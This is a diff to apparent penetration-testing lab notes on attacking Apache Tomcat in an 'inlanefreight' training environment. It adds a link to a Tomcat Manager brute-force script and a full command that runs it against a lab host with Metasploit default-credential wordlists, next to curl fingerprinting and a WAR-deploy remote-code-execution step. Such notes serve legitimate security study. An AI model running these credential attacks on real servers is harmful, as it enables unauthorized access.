@@ -157,9 +157,11 @@ curl http://app-dev.inlanefreight.local:8080/invalid
 curl -s http://app-dev.inlanefreight.local:8080/docs/ | grep Tomcat 
 ```
 - `tomcat-users.xml`
-- `/usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_users.txt`
-- `/usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_pass.txt`
+```bash
+https://github.com/b33lz3bub-1/Tomcat-Manager-Bruteforce
 
+python3 mgr_brute.py -U http://web01.inlanefreight.local:8180/ -P /manager -u /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_users.txt -p /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_pass.txt
+```
 ### RCE
 - `http://web01.inlanefreight.local:8180/manager/html > deploy war file`
 ```bash
